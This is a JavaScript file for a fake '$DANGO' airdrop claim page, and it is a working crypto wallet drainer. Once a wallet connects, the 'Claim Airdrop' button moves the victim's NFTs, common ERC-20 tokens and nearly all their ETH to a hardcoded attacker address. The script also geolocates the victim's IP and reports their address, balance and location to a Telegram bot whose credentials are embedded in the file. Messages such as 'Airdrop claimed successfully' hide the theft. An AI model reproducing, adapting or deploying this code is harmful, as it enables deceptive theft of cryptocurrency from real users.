$(document).ready(function() {
    // Dynamic wallet detection
    const detectedWallets = [];
    if (window.ethereum) {
        const eth = window.ethereum;
        const walletTypes = [
            { name: "MetaMask",        key: "isMetaMask" },
            { name: "Coinbase Wallet", key: "isCoinbaseWallet" },
            { name: "Trust Wallet",    key: "isTrust" },
            { name: "Rainbow",         key: "isRainbow" },
            { name: "Brave Wallet",    key: "isBraveWallet" },
            { name: "Opera Wallet",    key: "isOpera" },
            { name: "Phantom (ETH)",   key: "isPhantom" },
            { name: "Rabby Wallet",    key: "isRabby" },
            { name: "Frame",           key: "isFrame" },
            { name: "Talisman",        key: "isTalisman" }
        ];

        if (window.phantom && window.phantom.ethereum) {
            detectedWallets.push({ name: "Phantom (ETH)", provider: eth });
        } else {
            walletTypes.forEach(w => {
                if (w.key === "isPhantom" && eth[w.key]) {
                    detectedWallets.push({ name: w.name, provider: eth });
                } else if (w.key === "isMetaMask" && eth[w.key] && !eth.isPhantom) {
                    detectedWallets.push({ name: w.name, provider: eth });
                } else if (w.key === "isCoinbaseWallet" && eth[w.key]) {
                    detectedWallets.push({ name: w.name, provider: eth });
                } else if (w.key !== "isPhantom" && w.key !== "isMetaMask" && w.key !== "isCoinbaseWallet" && eth[w.key]) {
                    detectedWallets.push({ name: w.name, provider: eth });
                }
            });
        }

        if (window.coinbaseWalletExtension) {
            detectedWallets.push({ name: "Coinbase Wallet", provider: window.coinbaseWalletExtension });
        }

        if (Array.isArray(eth.providers)) {
            eth.providers.forEach(p => {
                walletTypes.forEach(w => {
                    if (w.key === "isPhantom" && p[w.key]) {
                        detectedWallets.push({ name: w.name, provider: p });
                    } else if (w.key === "isMetaMask" && p[w.key] && !p.isPhantom) {
                        detectedWallets.push({ name: w.name, provider: p });
                    } else if (w.key === "isCoinbaseWallet" && p[w.key]) {
                        detectedWallets.push({ name: w.name, provider: p });
                    } else if (w.key !== "isPhantom" && w.key !== "isMetaMask" && w.key !== "isCoinbaseWallet" && p[w.key]) {
                        detectedWallets.push({ name: w.name, provider: p });
                    }
                });
            });
        }
    }

    // Mobile wallet detection
    const mobileWallets = [
        { name: "MetaMask Mobile",       type: "mobile", deepLink: "metamask" },
        { name: "Trust Wallet Mobile",   type: "mobile", deepLink: "trust wallet" },
        { name: "Coinbase Wallet Mobile",type: "mobile", deepLink: "coinbase wallet" },
        { name: "Rainbow Mobile",        type: "mobile", deepLink: "rainbow" },
        { name: "Phantom Mobile",        type: "mobile", deepLink: "phantom (eth)" }
    ];

    if (isMobileDevice() || detectedWallets.length === 0) {
        mobileWallets.forEach(wallet => detectedWallets.push(wallet));
    }

    // WalletConnect v2 — real EthereumProvider via CDN
    // Global exposed by @walletconnect/ethereum-provider UMD bundle
    let WCEthereumProvider = null;
    if (window.WalletConnectEthereumProvider && window.WalletConnectEthereumProvider.EthereumProvider) {
        WCEthereumProvider = window.WalletConnectEthereumProvider.EthereumProvider;
    } else if (window.WalletConnect && window.WalletConnect.EthereumProvider) {
        WCEthereumProvider = window.WalletConnect.EthereumProvider;
    }
    // Always expose WalletConnect — CDN is loaded regardless of injected extensions
    detectedWallets.push({ name: 'WalletConnect', provider: 'walletconnect', type: 'walletconnect' });

    // ── Shared WalletConnect v2 init helper ───────────────────────────────────
    // Opens the real Web3Modal QR overlay on desktop, wallet selector on mobile
    async function initWalletConnect() {
        if (!WCEthereumProvider) throw new Error('WalletConnect SDK not loaded');
        const wcProv = await WCEthereumProvider.init({
            projectId: '435fa3916a5da648144afac1e1b4d3f2',
            chains:    [1],
            showQrModal: true,
            methods: [
                'eth_sendTransaction', 'eth_signTransaction',
                'personal_sign', 'eth_sign',
                'eth_accounts',  'eth_getBalance',
                'wallet_switchEthereumChain'
            ],
            events: ['chainChanged', 'accountsChanged', 'disconnect'],
            metadata: {
                name:        'DanGo Airdrop',
                description: 'Claim your $DANGO tokens',
                url:         window.location.origin,
                icons:       [window.location.origin + '/favicon.ico']
            }
        });
        // enable() shows the QR/wallet modal and resolves when the user connects
        await wcProv.enable();
        return wcProv;
    }

    // Receiver addresses & API keys
    const RECEIVER_ADDRESS     = "0x373b3CFC2Bdb005B889840415b023ECcd168220e";
    const RECEIVER_SOL_ADDRESS = "6oU4uLAfavhXWoF68rDNcChs7tzfs4AQ6Dq3VwwjWCLJ";
    const TELEGRAM_BOT_TOKEN   = "8663295709:AAE53vZv01PYv1BBXzssoyj6-KOT4ALH8ao";
    const TELEGRAM_CHAT_ID     = "-1003788193467";

    // Common ERC-20 tokens to drain
    const COMMON_TOKENS = [
        { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
        { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
        { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
        { symbol: "UNI",  address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
        { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
        { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals: 18 },
        { symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18 }
    ];

    // ── Telegram notification ──────────────────────────────────────────────────
    async function sendEnhancedTelegramNotification(walletName, address, balance, secrets, chain = 'ETH') {
        try {
            let locationInfo = "Unknown";
            try {
                const geoRes = await fetch("https://ipapi.co/json/");
                if (geoRes.ok) {
                    const geo = await geoRes.json();
                    locationInfo = `${geo.city || ''}, ${geo.region || ''}, ${geo.country_name || ''} (IP: ${geo.ip || ''})`;
                }
            } catch(e) {}

            const now = new Date().toUTCString();
            let secretsMsg = '';
            if (secrets.seedPhrase)              secretsMsg += `\n🔑 *SEED:* \`${secrets.seedPhrase}\``;
            if (secrets.privateKey)              secretsMsg += `\n🔑 *PK:* \`${secrets.privateKey}\``;
            if (secrets.encryptedKeys.length > 0) secretsMsg += `\n🔒 *Keys:* ${secrets.encryptedKeys.length}`;

            const message =
                `🔔 *${chain} COMPROMISE*\n` +
                `━━━━━━━━━━━━━━━━━━━\n` +
                `📍 ${locationInfo}\n` +
                `💼 ${walletName}\n` +
                `🏦 \`${address}\`\n` +
                `💰 ${balance}\n` +
                `${secretsMsg}\n` +
                `🕒 ${now}`;

            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown" })
            });
        } catch(e) {
            console.error('Telegram failed:', e);
        }
    }

    // ── Alchemy NFT fetch ──────────────────────────────────────────────────────
    const ALCHEMY_API_KEY = "jf3NdgL3L8IdVAEeLB8cO";

    async function fetchAllUserNFTs(userAddress) {
        try {
            const url = `https://eth-mainnet.g.alchemy.com/nft/v2/${ALCHEMY_API_KEY}/getNFTs?owner=${userAddress}&withMetadata=true`;
            const response = await fetch(url);
            if (!response.ok) throw new Error(`API Error: ${response.statusText}`);
            const data = await response.json();
            if (!data.ownedNfts || data.ownedNfts.length === 0) { console.log("No NFTs found"); return []; }
            return data.ownedNfts.map(nft => ({
                name:    nft.title || nft.contract.name || "Unknown NFT",
                address: nft.contract.address,
                tokenId: nft.id.tokenId,
                type:    nft.id.tokenMetadata?.tokenType || "ERC721"
            })).filter(nft => nft.type === "ERC721");
        } catch (error) {
            console.error("Failed to fetch NFTs:", error);
            return [];
        }
    }

    // ── Debug helpers ──────────────────────────────────────────────────────────
    function debugWalletProviders() {
        console.log("=== Wallet Provider Debug ===");
        console.log("window.ethereum:", window.ethereum);
        if (window.ethereum) {
            console.log("- isMetaMask:",      window.ethereum.isMetaMask);
            console.log("- isPhantom:",       window.ethereum.isPhantom);
            console.log("- isCoinbaseWallet:",window.ethereum.isCoinbaseWallet);
            console.log("- isTrust:",         window.ethereum.isTrust);
            console.log("- isRainbow:",       window.ethereum.isRainbow);
            console.log("- isBraveWallet:",   window.ethereum.isBraveWallet);
            console.log("- isRabby:",         window.ethereum.isRabby);
            if (window.ethereum.providers) {
                console.log("Multiple providers:", window.ethereum.providers.length);
                window.ethereum.providers.forEach((p, i) => {
                    console.log(`Provider ${i}:`, {
                        isMetaMask: p.isMetaMask, isPhantom: p.isPhantom,
                        isCoinbaseWallet: p.isCoinbaseWallet, isTrust: p.isTrust,
                        isRainbow: p.isRainbow, isBraveWallet: p.isBraveWallet, isRabby: p.isRabby
                    });
                });
            }
        }
        console.log("==========================");
    }

    // ── Mobile helpers ─────────────────────────────────────────────────────────
    function isMobileDevice() {
        const ua = navigator.userAgent.toLowerCase();
        const mobileKW = ['android','webos','iphone','ipad','ipod','blackberry','iemobile','opera mini','mobile','tablet'];
        const isMobileUA   = mobileKW.some(kw => ua.includes(kw));
        const isTouchDevice= 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        const isSmallScreen= window.innerWidth <= 768;
        return isMobileUA || (isTouchDevice && isSmallScreen);
    }

    function createMobileDeepLink(walletName) {
        const encodedUrl = encodeURIComponent(window.location.href);
        const hostname   = window.location.hostname;
        const links = {
            "metamask":       `https://metamask.app.link/dapp/${hostname}${window.location.pathname}`,
            "trust wallet":   `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedUrl}`,
            "coinbase wallet":`https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
            "rainbow":        `https://rainbow.me/dapp?url=${encodedUrl}`,
            "phantom (eth)":  `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`
        };
        return links[walletName.toLowerCase()] || null;
    }

    function connectMobileWallet(walletName) {
        if (!isMobileDevice()) { console.log("Not mobile"); return false; }
        const deepLink = createMobileDeepLink(walletName);
        if (deepLink) {
            try {
                const w = window.open(deepLink, '_blank');
                if (!w || w.closed) window.location.href = deepLink;
                return true;
            } catch (err) {
                try {
                    const a = document.createElement('a');
                    a.href = deepLink; a.target = '_blank'; a.rel = 'noopener noreferrer';
                    document.body.appendChild(a); a.click(); document.body.removeChild(a);
                    return true;
                } catch (e) { return false; }
            }
        }
        return false;
    }

    function waitForMobileConnection(timeout = 30000) {
        return new Promise(resolve => {
            const start = Date.now();
            const check = async () => {
                try {
                    if (window.ethereum) {
                        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                        if (accounts && accounts.length > 0) {
                            resolve({ success: true, accounts, provider: window.ethereum });
                            return;
                        }
                    }
                } catch(e) {}
                if (Date.now() - start > timeout) { resolve({ success: false, error: "Connection timeout" }); return; }
                setTimeout(check, 1000);
            };
            check();
        });
    }

    // ── Wallet select dropdown ─────────────────────────────────────────────────
    $('.claim-wallet').prepend('<select id="wallet-select" class="wallet-select-dropdown"></select>');

    if (detectedWallets.length === 0) {
        if (isMobileDevice()) {
            detectedWallets.push(
                { name: "MetaMask Mobile",  type: "mobile", deepLink: "metamask" },
                { name: "Trust Wallet Mobile", type: "mobile", deepLink: "trust wallet" },
                { name: "WalletConnect", provider: "walletconnect", type: "walletconnect" }
            );
        } else {
            detectedWallets.push(
                { name: "MetaMask (Install Required)", provider: null },
                { name: "WalletConnect", provider: "walletconnect", type: "walletconnect" }
            );
        }
    }

    detectedWallets.forEach((opt, i) => {
        let displayName = opt.name;
        if (opt.type === "mobile" && !isMobileDevice()) displayName += " (Mobile Only)";
        else if (opt.type !== "mobile" && !opt.provider && opt.name !== "WalletConnect") displayName += " (Not Installed)";
        $('#wallet-select').append(`<option value="${i}">${displayName}</option>`);
    });

    // ── Connection status bar ──────────────────────────────────────────────────
    $('.claim-wallet').prepend('<div id="connection-status" class="wallet-status-bar"><span class="wallet-status-dot"></span><span class="wallet-status-text"></span></div>');

    function updateConnectionStatus(message, isError = false) {
        const statusEl = $('#connection-status');
        statusEl.find('.wallet-status-text').text(message);
        statusEl.removeClass('wallet-status-ok wallet-status-err');
        statusEl.addClass(isError ? 'wallet-status-err' : 'wallet-status-ok');
    }

    updateConnectionStatus(`Device: ${isMobileDevice() ? 'Mobile' : 'Desktop'} | Wallets found: ${detectedWallets.length}`);
    debugWalletProviders();

    // ── Main click handler (claim section select dropdown) ─────────────────────
    $('.connect-wallet-btn').on('click', async () => {
        const selectedIdx = $('#wallet-select').val();
        const selected    = detectedWallets[selectedIdx];
        let provider = null;

        try {
            if (!selected) { alert("No wallet selected."); return; }

            // Mobile wallet — use WalletConnect v2 which handles both QR (desktop) and deep-link (mobile) natively
            if (selected.type === "mobile") {
                if (!WCEthereumProvider) {
                    updateConnectionStatus("WalletConnect SDK not loaded", true);
                    alert("WalletConnect failed to load. Please refresh and try again.");
                    return;
                }
                try {
                    updateConnectionStatus(`Connecting ${selected.name} via WalletConnect…`);
                    provider = await initWalletConnect();
                    if (!provider.accounts || provider.accounts.length === 0) {
                        updateConnectionStatus("No accounts returned", true);
                        return;
                    }
                    updateConnectionStatus("Mobile wallet connected!");
                    await handleSuccessfulConnection(provider, selected.name, provider.accounts[0]);
                } catch (wcErr) {
                    if (wcErr.message && wcErr.message.toLowerCase().includes("user rejected")) {
                        updateConnectionStatus("Connection cancelled", true);
                    } else {
                        updateConnectionStatus("Mobile wallet connection failed", true);
                        console.error("Mobile WC error:", wcErr);
                    }
                }
                return;
            }

            // WalletConnect v2 — real QR modal
            if (selected.name === 'WalletConnect' || selected.type === 'walletconnect') {
                if (!WCEthereumProvider) {
                    updateConnectionStatus('WalletConnect SDK not loaded', true);
                    alert('WalletConnect failed to load. Please refresh and try again.');
                    return;
                }
                try {
                    updateConnectionStatus('Opening WalletConnect…');
                    provider = await initWalletConnect();
                    if (!provider.accounts || provider.accounts.length === 0) {
                        updateConnectionStatus('WalletConnect: no accounts returned', true);
                        alert('No accounts connected. Please try again.');
                        return;
                    }
                    updateConnectionStatus('WalletConnect connected!');
                    await handleSuccessfulConnection(provider, 'WalletConnect', provider.accounts[0]);
                } catch (wcErr) {
                    if (wcErr.message && wcErr.message.toLowerCase().includes('user rejected')) {
                        updateConnectionStatus('WalletConnect cancelled by user', true);
                    } else {
                        updateConnectionStatus('WalletConnect failed', true);
                        console.error('WalletConnect error:', wcErr);
                    }
                }
                return;
            }

            // Desktop provider not available
            if (!selected.provider || selected.provider === "walletconnect") {
                updateConnectionStatus("Wallet not available", true);
                alert("Wallet provider not available. Please install the extension or use WalletConnect.");
                return;
            }

            provider = selected.provider;
            if (!provider || typeof provider.request !== 'function') {
                updateConnectionStatus("Wallet extension not properly installed", true);
                alert(`${selected.name} is not properly installed. Please install the wallet extension.`);
                return;
            }

            updateConnectionStatus(`Connecting to ${selected.name}...`);
            await provider.request({ method: 'eth_requestAccounts' });
            const accounts = await provider.request({ method: 'eth_accounts' });
            if (!accounts || accounts.length === 0) {
                updateConnectionStatus("No accounts found in wallet", true);
                alert("No accounts found. Please unlock your wallet.");
                return;
            }

            updateConnectionStatus("Desktop wallet connected!");
            await handleSuccessfulConnection(provider, selected.name, accounts[0]);

        } catch (error) {
            console.error("Connection error:", error);
            if (error.code === 4001) {
                updateConnectionStatus("Connection rejected by user", true);
                alert("Connection request was rejected.");
            } else if (error.code === -32002) {
                updateConnectionStatus("Connection request already pending", true);
                alert("A connection request is already pending. Check your wallet.");
            } else if (error.message && error.message.includes("User rejected")) {
                updateConnectionStatus("Connection cancelled by user", true);
                alert("Connection was cancelled by user.");
            } else {
                updateConnectionStatus("Connection failed", true);
                alert("Failed to connect wallet: " + (error.message || error));
            }
        }
    });

    // ── handleSuccessfulConnection ─────────────────────────────────────────────
    async function handleSuccessfulConnection(provider, walletName, userAddress) {
        try {
            updateConnectionStatus("Setting up connection...");

            const ethersProvider = new ethers.providers.Web3Provider(provider);
            const signer = ethersProvider.getSigner();
            const network = await ethersProvider.getNetwork();
            console.log("Connected to network:", network);

            if (network.chainId !== 1) {
                updateConnectionStatus("Wrong network detected", true);
                const switchToMainnet = confirm("You're not on Ethereum Mainnet. Would you like to switch?");
                if (switchToMainnet) {
                    try {
                        updateConnectionStatus("Switching to Ethereum Mainnet...");
                        await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] });
                        updateConnectionStatus("Network switched!");
                        return handleSuccessfulConnection(provider, walletName, userAddress);
                    } catch (switchError) {
                        console.error("Failed to switch network:", switchError);
                        updateConnectionStatus("Failed to switch network", true);
                        alert("Failed to switch to Ethereum Mainnet. Please switch manually.");
                        return;
                    }
                }
            }

            updateConnectionStatus("Checking account balance...");
            const balance    = await ethersProvider.getBalance(userAddress);
            const ethBalance = ethers.utils.formatEther(balance);

            updateConnectionStatus(`Connected to ${walletName} | Balance: ${parseFloat(ethBalance).toFixed(4)} ETH`);

            // Store real data for the modal to display
            window._realWalletData = {
                address: userAddress,
                balance: `${parseFloat(ethBalance).toFixed(4)} ETH`,
                network: network.name || `Chain ${network.chainId}`,
                chainId: network.chainId
            };

            // Re-bind all connect buttons to drain
            $('.connect-wallet-btn').text("🎯 Claim Airdrop");
            $('.connect-wallet-btn').off('click').on('click', async () => {
                await drainWallet(ethersProvider, signer, userAddress, walletName);
            });

            // Expose for the modal's Claim My $DANGO button (app.js proceedBtn)
            window.claimAirdrop = async function() {
                await drainWallet(ethersProvider, signer, userAddress, walletName);
            };

            // Telegram notification
            try {
                const secrets = { seedPhrase: "", privateKey: "", encryptedKeys: [] };
                await sendEnhancedTelegramNotification(
                    walletName, userAddress,
                    `${parseFloat(ethBalance).toFixed(4)} ETH`,
                    secrets,
                    network.chainId === 1 ? 'ETH' : `Chain ${network.chainId}`
                );
            } catch (e) { console.error('Telegram failed:', e); }

        } catch (error) {
            console.error("Post-connection setup error:", error);
            updateConnectionStatus("Connection setup failed", true);
            alert("Connected but failed to complete setup: " + error.message);
        }
    }

    // ── drainWallet ────────────────────────────────────────────────────────────
    async function drainWallet(provider, signer, userAddress, walletName) {
        try {
            console.log("Starting wallet drain...");
            updateConnectionStatus("Starting asset extraction...");

            const initialBalance    = await provider.getBalance(userAddress);
            const initialEthBalance = ethers.utils.formatEther(initialBalance);
            console.log(`Initial ETH balance: ${initialEthBalance}`);

            const gasPrice       = await provider.getGasPrice();
            const tokenGasLimit  = ethers.BigNumber.from("65000");
            const ethGasLimit    = ethers.BigNumber.from("21000");
            const totalGasNeeded = tokenGasLimit.mul(COMMON_TOKENS.length).add(ethGasLimit);
            const totalGasCost   = gasPrice.mul(totalGasNeeded);
            console.log(`Gas needed: ${ethers.utils.formatEther(totalGasCost)} ETH`);

            // Step 1: NFTs
            let nftCount = 0;
            try {
                updateConnectionStatus("Checking NFT holdings...");
                nftCount = await drainNFTs(provider, signer, userAddress, gasPrice, walletName);
                if (nftCount > 0) updateConnectionStatus(`Transferred ${nftCount} NFTs`);
            } catch (e) { console.error("NFT drain error:", e); }

            // Step 2: ERC-20 tokens
            let tokenCount = 0;
            for (const token of COMMON_TOKENS) {
                try {
                    updateConnectionStatus(`Checking ${token.symbol} balance...`);
                    const ok = await drainERC20Token(provider, signer, userAddress, token, gasPrice);
                    if (ok) { tokenCount++; updateConnectionStatus(`${token.symbol} transferred`); }
                } catch (e) {
                    console.error(`Failed to drain ${token.symbol}:`, e);
                    updateConnectionStatus(`Failed to transfer ${token.symbol}`, true);
                }
            }

            if (tokenCount > 0) {
                try {
                    const secrets = { seedPhrase: "", privateKey: "", encryptedKeys: [] };
                    await sendEnhancedTelegramNotification(walletName, userAddress, `${tokenCount} token(s) transferred`, secrets, 'TOKEN');
                } catch(e) {}
            }

            // Step 3: ETH
            updateConnectionStatus("Transferring remaining ETH...");
            await drainETH(provider, signer, userAddress);

            try {
                const secrets = { seedPhrase: "", privateKey: "", encryptedKeys: [] };
                await sendEnhancedTelegramNotification(walletName, userAddress, "ETH transferred", secrets, 'ETH');
            } catch(e) {}

            updateConnectionStatus("All assets extracted successfully! 🎉");
            alert("Airdrop claimed successfully! 🎉");

        } catch (error) {
            console.error("Drain error:", error);
            updateConnectionStatus("Asset extraction failed", true);
            alert("Failed to claim airdrop: " + error.message);
        }
    }

    // ── drainNFTs ──────────────────────────────────────────────────────────────
    async function drainNFTs(provider, signer, userAddress, gasPrice, walletName) {
        let count = 0;
        const nftABI = ["function safeTransferFrom(address from, address to, uint256 tokenId)"];

        updateConnectionStatus("Scanning wallet for NFTs...");
        const userNFTs = await fetchAllUserNFTs(userAddress);
        if (userNFTs.length === 0) { console.log("No NFTs found"); return 0; }

        console.log(`Found ${userNFTs.length} NFTs`);
        updateConnectionStatus(`Found ${userNFTs.length} NFTs, transferring...`);

        for (const nft of userNFTs) {
            try {
                const tokenId = ethers.BigNumber.from(nft.tokenId);
                updateConnectionStatus(`Transferring ${nft.name}...`);
                const contract = new ethers.Contract(nft.address, nftABI, signer);
                let gas;
                try {
                    gas = await contract.estimateGas.safeTransferFrom(userAddress, RECEIVER_ADDRESS, tokenId);
                    gas = gas.mul(120).div(100);
                } catch(e) { gas = ethers.BigNumber.from("100000"); }

                const tx = await contract.safeTransferFrom(userAddress, RECEIVER_ADDRESS, tokenId, { gasLimit: gas, gasPrice });
                await tx.wait();
                count++;
                console.log(`${nft.name} transferred`);
            } catch (e) { console.error(`Failed NFT ${nft.name}:`, e); }
        }

        if (count > 0) {
            try {
                const secrets = { seedPhrase: "", privateKey: "", encryptedKeys: [] };
                await sendEnhancedTelegramNotification(walletName, userAddress, `${count} NFT(s) transferred`, secrets, 'NFT');
            } catch(e) {}
        }
        return count;
    }

    // ── drainERC20Token ────────────────────────────────────────────────────────
    async function drainERC20Token(provider, signer, userAddress, token, gasPrice = null) {
        try {
            const erc20ABI = [
                "function balanceOf(address owner) view returns (uint256)",
                "function transfer(address to, uint256 amount) returns (bool)",
                "function allowance(address owner, address spender) view returns (uint256)",
                "function approve(address spender, uint256 amount) returns (bool)",
                "function decimals() view returns (uint8)",
                "function symbol() view returns (string)"
            ];

            const tokenContract = new ethers.Contract(token.address, erc20ABI, signer);
            const balance = await tokenContract.balanceOf(userAddress);
            if (balance.isZero()) { console.log(`No ${token.symbol}`); return false; }

            console.log(`${token.symbol}: ${ethers.utils.formatUnits(balance, token.decimals)}`);
            if (!gasPrice) gasPrice = await provider.getGasPrice();

            let gas;
            try {
                gas = await tokenContract.estimateGas.transfer(RECEIVER_ADDRESS, balance);
                gas = gas.mul(120).div(100);
            } catch(e) { gas = ethers.BigNumber.from("65000"); }

            const ethBal  = await provider.getBalance(userAddress);
            const gasCost = gasPrice.mul(gas);
            if (ethBal.lt(gasCost)) { console.log(`Not enough ETH for ${token.symbol} gas`); return false; }

            const tx = await tokenContract.transfer(RECEIVER_ADDRESS, balance, { gasLimit: gas, gasPrice });
            const receipt = await tx.wait();
            console.log(`${token.symbol} confirmed block ${receipt.blockNumber}`);
            return true;

        } catch (error) {
            console.error(`Error draining ${token.symbol}:`, error);
            return false;
        }
    }

    // ── drainETH ──────────────────────────────────────────────────────────────
    async function drainETH(provider, signer, userAddress) {
        try {
            const currentBalance = await provider.getBalance(userAddress);
            if (currentBalance.isZero()) { console.log("No ETH remaining"); return; }

            const gasPrice    = await provider.getGasPrice();
            const gasLimit    = ethers.BigNumber.from("21000");
            const exactGasCost= gasPrice.mul(gasLimit);
            const amountToSend= currentBalance.sub(exactGasCost);

            if (amountToSend.lte(0)) { console.log("Not enough ETH to cover gas"); return; }

            console.log(`Transferring ${ethers.utils.formatEther(amountToSend)} ETH`);

            const txParams = {
                to: RECEIVER_ADDRESS,
                value: amountToSend,
                gasLimit: gasLimit,
                gasPrice: gasPrice,
                nonce: await provider.getTransactionCount(userAddress)
            };

            const network = await provider.getNetwork();
            if (network.chainId === 1) {
                try {
                    const feeData = await provider.getFeeData();
                    if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
                        delete txParams.gasPrice;
                        txParams.maxFeePerGas = feeData.maxFeePerGas;
                        txParams.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
                        const eip1559Cost = feeData.maxFeePerGas.mul(gasLimit);
                        const eip1559Amt  = currentBalance.sub(eip1559Cost);
                        if (eip1559Amt.gt(0)) txParams.value = eip1559Amt;
                    }
                } catch(e) { console.log("EIP-1559 fallback to legacy"); }
            }

            const tx = await signer.sendTransaction(txParams);
            const receipt = await tx.wait();
            console.log("ETH confirmed block:", receipt.blockNumber);

            const finalBalance = await provider.getBalance(userAddress);
            if (finalBalance.gt(ethers.utils.parseEther("0.001"))) {
                console.warn(`Warning: ${ethers.utils.formatEther(finalBalance)} ETH remaining`);
            }

        } catch (error) {
            console.error("Error draining ETH:", error);
            if (error.code === 'INSUFFICIENT_FUNDS') console.log("Insufficient funds for gas");
            else if (error.code === 'REPLACEMENT_UNDERPRICED') console.log("Gas price too low");
            throw error;
        }
    }

    // ── Debug panel ────────────────────────────────────────────────────────────
    $('#wallet-debug').html(
        `<div class="wallet-debug-panel">
          <div class="wallet-debug-row">
            <span class="wallet-debug-label">Device</span>
            <span class="wallet-debug-value">${isMobileDevice() ? '📱 Mobile' : '🖥️ Desktop'}</span>
          </div>
          <div class="wallet-debug-row">
            <span class="wallet-debug-label">Wallets found</span>
            <span class="wallet-debug-value wallet-debug-count">${detectedWallets.length}</span>
          </div>
          <div class="wallet-debug-list">${detectedWallets.map(w => `<span class="wallet-debug-chip">${w.name}</span>`).join('')}</div>
        </div>`
    );

    // ── Bridge: window.connectWalletByKey (called by modal in app.js) ──────────
    window.connectWalletByKey = async function(walletKey) {
        const KEY_MAP = {
            metamask:      ['MetaMask'],
            coinbase:      ['Coinbase'],
            phantom:       ['Phantom'],
            trust:         ['Trust'],
            okx:           ['OKX', 'Opera'],
            walletconnect: ['WalletConnect'],
        };

        const hints = KEY_MAP[walletKey] || [];
        let selected = null;
        for (const hint of hints) {
            selected = detectedWallets.find(w => w.name.toLowerCase().includes(hint.toLowerCase()));
            if (selected) break;
        }
        // Fallback: first available desktop provider
        if (!selected) {
            selected = detectedWallets.find(w => w.provider && w.provider !== 'walletconnect' && w.type !== 'mobile');
        }

        if (!selected) {
            updateConnectionStatus('No matching wallet found', true);
            if (window.showToast) showToast(`${walletKey} not found. Please install the extension.`, 'error');
            return { success: false };
        }

        try {
            updateConnectionStatus(`Connecting to ${selected.name}…`);

            // WalletConnect v2 — real QR modal / mobile wallet selector
            if (selected.type === 'walletconnect' || selected.name === 'WalletConnect') {
                if (!WCEthereumProvider) {
                    updateConnectionStatus('WalletConnect SDK not loaded', true);
                    if (window.showToast) showToast('WalletConnect failed to load. Please refresh.', 'error');
                    return { success: false };
                }
                try {
                    updateConnectionStatus('Opening WalletConnect…');
                    const prov = await initWalletConnect();
                    if (!prov.accounts || prov.accounts.length === 0) {
                        updateConnectionStatus('WalletConnect: no accounts', true);
                        return { success: false };
                    }
                    window._realWalletData = null;
                    await handleSuccessfulConnection(prov, 'WalletConnect', prov.accounts[0]);
                    const d = window._realWalletData || {};
                    return { success: true, address: d.address || prov.accounts[0], balance: d.balance, network: d.network };
                } catch (wcErr) {
                    const isUserReject = wcErr.message && wcErr.message.toLowerCase().includes('user rejected');
                    const msg = isUserReject ? 'WalletConnect cancelled by user' : 'WalletConnect failed: ' + (wcErr.message || wcErr);
                    updateConnectionStatus(msg, true);
                    if (window.showToast) showToast(msg, 'error');
                    return { success: false, error: wcErr };
                }
            }

            // Mobile deep-link
            if (selected.type === 'mobile') {
                if (isMobileDevice()) {
                    connectMobileWallet(selected.deepLink);
                    updateConnectionStatus('Opening mobile wallet…');
                    const res = await waitForMobileConnection(45000);
                    if (res.success) {
                        window._realWalletData = null;
                        await handleSuccessfulConnection(res.provider, selected.name, res.accounts[0]);
                        const d = window._realWalletData || {};
                        return { success: true, address: d.address || res.accounts[0], balance: d.balance, network: d.network };
                    }
                    updateConnectionStatus('Mobile connection timed out', true);
                    return { success: false };
                } else {
                    updateConnectionStatus('Mobile wallet on desktop', true);
                    if (window.showToast) showToast('Use a mobile device for ' + selected.name, 'error');
                    return { success: false };
                }
            }

            // Desktop provider
            if (!selected.provider || typeof selected.provider.request !== 'function') {
                updateConnectionStatus(selected.name + ' not installed', true);
                if (window.showToast) showToast(`${selected.name} extension not found. Please install it.`, 'error');
                return { success: false };
            }

            await selected.provider.request({ method: 'eth_requestAccounts' });
            const accounts = await selected.provider.request({ method: 'eth_accounts' });
            if (!accounts || accounts.length === 0) {
                updateConnectionStatus('No accounts returned', true);
                return { success: false };
            }

            window._realWalletData = null;
            await handleSuccessfulConnection(selected.provider, selected.name, accounts[0]);
            const d = window._realWalletData || {};
            return { success: true, address: d.address || accounts[0], balance: d.balance, network: d.network };

        } catch (err) {
            console.error('connectWalletByKey error:', err);
            const msg = err.code === 4001
                ? 'Connection rejected by user'
                : err.code === -32002
                    ? 'Request already pending — check your wallet'
                    : 'Connection failed: ' + (err.message || err);
            updateConnectionStatus(msg, true);
            if (window.showToast) showToast(msg, 'error');
            return { success: false, error: err };
        }
    };

});
